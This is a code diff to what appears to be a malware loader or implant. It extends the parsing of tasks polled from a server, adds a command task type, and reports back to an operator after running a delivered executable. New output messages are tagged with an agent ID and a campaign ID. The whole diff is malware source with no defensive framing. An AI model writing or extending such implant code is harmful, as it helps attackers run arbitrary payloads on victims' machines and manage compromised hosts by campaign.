@@ -52,7 +52,7 @@ LdrTask LdrPollServer() {
     if(task.FileType == FILE_EXE) {
     	task.hasReloc = ParserRead4(pr);
     }
-    if(task.code == TASK_MODULE) {
+    if(task.code == TASK_MODULE || task.code == TASK_CMD) {
     	HasArgs = ParserRead4(pr);
     }
     task.DataSize = ParserRead4(pr);
@@ -78,14 +78,24 @@ LdrTask LdrPollServer() {
 
 }
 
-BOOL LdrLoadAndRun(LdrTask info, BOOL CleanUpAfter) {
+BOOL LdrLoadAndRun(LdrTask info, ParserWrite *p) {
 	switch (info.code) {
 	case TASK_LOAD:
 		if(!LdrRunExe(info))
 			return FALSE;
+		// No payload to return — tell the server the task launched so it can
+		// mark it done and notify the operator.
+		ParserWrite4(p, OUTPUT_NO_DATA);
 		return TRUE;
 	default:
 		return FALSE;
 	}
+}
+
+void LdrBeginOutput(ParserWrite *p, DWORD taskId) {
+	ParserWrite4(p, MSG_OUTPUT);
+	ParserWriteBytes(p, (PBYTE)ldr->config->AgentId, LdrStrlen(ldr->config->AgentId));
+	ParserWriteBytes(p, (PBYTE)ldr->config->CampaignID, LdrStrlen(ldr->config->CampaignID));
+	ParserWrite4(p, taskId);
 }
 
